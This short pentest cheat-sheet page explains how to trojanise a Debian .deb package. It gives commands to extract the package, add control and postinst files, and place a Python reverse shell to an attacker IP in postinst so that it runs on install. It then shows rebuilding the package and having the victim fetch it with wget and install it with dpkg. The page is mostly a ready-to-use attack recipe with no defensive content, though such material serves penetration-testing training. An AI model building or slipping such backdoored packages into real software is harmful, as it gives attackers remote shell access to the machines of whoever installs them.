# 🐧 Binary Linux Trojan

## Linux DEB Package Backdoor

### Practical

#### Infecting a Deb Package

For this you need a .deb file

```
# Extract the .deb file
dpkg -x <file.deb> <folder>

# Create a new directory called DEBIAN
mkdir <folder>/DEBIAN

# Inside the DEBIAN directory create a file called control and postinst
touch control postinst
```

Add the below commands inside the control file

```
Package: <package name>
Version: <version number>
Section: <app category>
Priotiry: <Optional>
Architecture: <architecture> # Architecture should support on the victim machine.
Maintainer: <name>
Description: <app description>
```

Add the below commands inside the postinst file

```
#!/bin/sh

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker ip>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Make the postinst file executable and make new package file

```
chmod 755 postinst

dpkg-deb --build /tmp/evil/<folder>
```

#### Installing the deb package in the victim machine

```
wget http://<attacker ip>/<maclicious.deb>

dpkg -i <malicious.deb>
```



***

## REFERENCES

* [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [https://www.offsec.com/metasploit-unleashed/binary-linux-trojan/](https://www.offsec.com/metasploit-unleashed/binary-linux-trojan/)
